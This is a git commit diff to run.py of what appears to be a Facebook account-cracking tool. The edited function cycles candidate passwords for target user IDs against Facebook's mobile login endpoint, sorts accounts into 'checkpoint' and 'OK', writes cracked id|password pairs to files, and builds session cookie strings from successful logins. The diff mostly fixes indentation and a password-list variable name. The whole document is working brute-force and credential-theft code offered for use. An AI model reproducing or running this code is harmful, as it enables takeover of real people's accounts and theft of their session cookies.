0952ca3b27e521d8d5de45ed5a261c11a54e5cc3
Viper <106883384+Rudal-XD@users.noreply.github.com>
2024-01-12 10:17:43 +0700

    Update run.py

--- run.py
+++ run.py
@@ -4412,14 +4412,11 @@ def reguler(idf,pwv,url):
 	global loop,ok,cp
 	rr = random.randint
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
-	prog.update(
-        des,
-        description=f" {K2}•{H2} ASYNC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]",
-    )
+	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	ua = random.choice(prem)
 	ses = requests.Session()
-	for pw in pwf:
+	for pw in pwv:
 		pw = pw.lower()
 		try:
 			memek = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr")
@@ -4471,22 +4468,19 @@ def reguler(idf,pwv,url):
 			hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp += 1
-                tree = Tree(
-                    Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),
-                    guide_style="bold grey100",
-                )
-                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                os.popen("play-audio c.mp3")
-                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-                ceker(idf, pw)
-                akun.append(idf + "|" + pw)
-                break
+				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio c.mp3")
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				ceker(idf, pw)
+				akun.append(idf + "|" + pw)
+				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok += 1
-                coki = po.cookies.get_dict()
-                kuki = (
+				coki = po.cookies.get_dict()
+				kuki = (
                     "datr="
                     + coki["datr"]
                     + ";"
@@ -4500,19 +4494,16 @@ def reguler(idf,pwv,url):
                     + ";"
                     + ("fr=" + coki["fr"])
                     + ";"
-                )
-                tree = Tree(
-                    Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),
-                    guide_style="bold grey100",
-                )
-                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{H2}{ua}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                os.popen("play-audio o.mp3")
-                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-                cek_apk(kuki)
-                break
+				)
+				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{ua}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio o.mp3")
+				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+				cek_apk(kuki)
+				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
 	loop+=1
